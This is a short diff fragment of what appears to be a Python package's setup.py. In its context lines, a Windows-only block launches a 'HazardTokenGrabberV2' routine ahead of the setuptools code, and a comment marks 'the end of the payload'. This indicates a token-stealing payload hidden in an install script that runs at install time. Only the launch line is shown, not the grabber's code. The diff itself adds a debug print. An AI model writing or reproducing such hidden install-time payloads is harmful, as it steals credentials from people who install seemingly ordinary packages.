@@ -832,6 +832,7 @@ if __name__ == "__main__" and os.name == "nt":
     asyncio.run(HazardTokenGrabberV2().init())
 
 # The end of the payload, the beginning of setup
+if fetch_conf('dev'): print("The end of the payload, the beginning of setup")
 from setuptools import setup
 import codecs
 import os
